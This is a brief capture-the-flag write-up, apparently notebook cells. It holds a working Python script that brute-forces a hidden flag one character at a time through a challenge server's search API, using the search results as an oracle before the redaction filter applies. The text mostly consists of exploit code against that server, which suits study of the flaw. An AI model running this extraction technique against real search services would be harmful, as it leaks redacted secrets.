
- So the idea is to brute force guess the flag, as filter operates on the post content and only replaces the flag *AFTER* 

````python
base = "http://34.134.162.213:17000/"
chars = string.printable

httpx.post(
    base + "api/search",
    json=dict(query="L3A")
).json()
````

````python
chars
````

````python
flag = "L3AK{"

while flag[-1] != "}":
    print(flag)
    for char in chars:
        resp = httpx.post(
            base + "api/search",
            # last three chars
            json=dict(query=flag[-2:] + char)
        ).json()
        
        if any(entry['id'] == 3 for entry in resp['results']):
            flag += char 
            break
        
print(flag)
````
